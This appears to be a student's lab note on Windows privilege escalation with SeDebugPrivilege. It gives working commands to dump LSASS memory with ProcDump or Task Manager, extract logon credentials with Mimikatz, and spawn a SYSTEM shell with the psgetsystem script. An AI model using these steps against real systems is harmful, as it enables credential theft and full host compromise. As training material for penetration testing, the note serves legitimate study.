# SeDebugPrivilege
## whoami /priv confirms that SeDebugPrivilege is listed.
1. We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system
```
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
2. Mimikatz
```
log
```
```
sekurlsa::minidump lsass.dmp
```
3. input the directory for lsass.dmp
```
sekurlsa::logonpasswords
```
Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the LSASS process via the Task Manager by browsing to the Details tab, choosing the LSASS process, and selecting Create dump file. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.
### Remote Code Execution as SYSTEM
1. transfer this PoC script over to the target system.
```
https://github.com/decoder-it/psgetsystem?tab=readme-ov-file
```
2. open an elevated PowerShell console
3. type `tasklist` to get a listing of running processes and accompanying PIDs.
4. Here we can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts. (winlogon ppid is 1868 in my case)
```
.\psgetsys.ps1
```
```
ImpersonateFromParentPid -ppid 1868 -command C:\Windows\System32\cmd.exe
```
5. We could also use the Get-Process cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.
```
ImpersonateFromParentPid -ppid (Get-Process "lsass").Id -command C:\Windows\System32\cmd.exe
```

